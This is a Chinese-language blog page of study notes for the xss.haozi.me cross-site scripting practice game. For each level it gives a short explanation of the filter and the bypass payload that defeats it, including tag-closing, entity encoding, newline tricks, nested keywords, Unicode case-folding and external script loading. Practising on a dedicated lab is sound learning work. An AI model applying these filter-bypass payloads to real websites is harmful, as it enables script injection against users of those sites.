---
layout: page
title: "XSS练习"
date: 2019-10-29 01:01
---

[TOC]

## 实验平台
[https://curtails.github.io/xss](https://curtails.github.io/xss/)  
[https://xss.haozi.me](https://xss.haozi.me)

## xss-demo
[github](https://github.com/haozi/xss-demo/)  
[在线地址](https://xss.haozi.me)

拼凑所需语句即可不必关心原语句完整性？？浏览器容错性？？
- 0x00 `<script>alert(1)</script>` 无任何过滤
- 0x01 `</textarea><script>alert(1)</script>`闭合标签
- 0x02 `"> <script>alert(1)</script>`闭合标签
- 0x03 

```js
<script>alert`1`</script>
<svg><script>alert&#40;1&#41</script>
``` 

正则表达式过滤() 用``绕过或实体编码的字符编码
- 0x04 同0x03 

```js
<svg><script>alert&#40;1&#41</script>
<iframe onload=alert&#40;1&#41></iframe>
```
- 0x05
将-->替换成😀 html注释`<!--xxs--->`或`<!--xss--!>`
payload:`--!> <script>alert(1)</script>`

- 0x06
过滤`auto*****=`或`on*****=`替换为_ 可用换行符绕过

```js
onmousemove
=alert(1)

type=image src onerror
=alert(1)
```
- 0x07
匹配<***>字符串忽略大小写替换为空

```js
<svg/onload=alert(1) //有空格
```

- 0x08
将`</style>`替换成`/*坏人*/` 在标签>之前加个空格或换行就好了

```js
</style ><script>alert(1)</script>
</style
><script>alert(1)</script>
```

- 0x09
输入要以https://www.segmentfault.com开头 有一种payload是在网站上存在alert(1)js脚本

```js
https://www.segmentfault.com.haozi.me/j.js
```

- 0x0a
构造符合条件 只能引入外部js
```
https://www.segmentfault.com.haozi.me/j.js
```

- 0X0b
标签、域名不区分大小写
```
<script src="https://www.segmentfault.com.haozi.me/j.js"></script>
```

- 0x0c
正则替换script为空
```
<scrscriptipt src="https://www.segmentfault.com.haozi.me/j.js"></scrscriptipt>
```

- 0x0d
换行加单行注释绕过
```
 
alert(1)
-->
```

- 0x0e
正则过滤<+英文字母 转化大写  
使用`ſ` 古英语 转换为大写变成`S`
```
<ſcript src="https://xss.haozi.me/j.js"></script>
```

- 0x0f
正则过滤 但是`&#39;`解码后仍然是'也就是说这个过滤是不起作用的  
闭合括号即可
```
');alert('1   
```

- 0x10
闭合括号没什么好说的
```
'';alert(1)
```

- 0x11
javascript:console.log()js的调试功能 相当于控制台
正则过滤了好多 但也是能直接闭合
```
"),alert(1)("
```

- 0x12
直接new个script标签
```
</script><script>alert`1`;</script><script>
```
或
```
\");alert(1)//
" 被转义成 \" 经过html解析后里面变成 console.log("\") 会报语法错误, 再补个 \ 即可
```

